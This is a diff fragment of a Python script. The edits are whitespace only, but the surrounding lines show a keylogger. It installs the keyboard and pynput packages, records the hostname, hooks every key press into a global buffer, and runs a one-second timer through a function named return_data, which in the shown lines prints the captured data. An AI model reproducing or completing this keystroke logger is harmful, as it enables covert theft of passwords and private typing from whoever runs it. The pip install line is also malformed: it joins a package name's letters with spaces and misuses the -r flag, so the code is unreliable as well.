@@ -15,8 +15,6 @@ if sys.version_info.major >= 3:
         packages = ["keyboard","pynput"]
         for package in packages:
             subprocess.call("python3 -m pip install -r" + ' '.join(package), shell=True)
-            
-        
 
     finally:
         USER_HOSTNAME = socket.gethostname()
@@ -30,8 +28,7 @@ if sys.version_info.major >= 3:
             send_data_interval = threading.Timer(1, return_data)
             print(data)
             send_data_interval.start()
-            
-            
+               
         def on_press(key):
             global data
             if key == keyboard.Key.space:
@@ -52,7 +49,6 @@ if sys.version_info.major >= 3:
         with keyboard.Listener(on_press=on_press) as listener:
             return_data()
             listener.join()  
-
 else:
     os._exit(0)
     
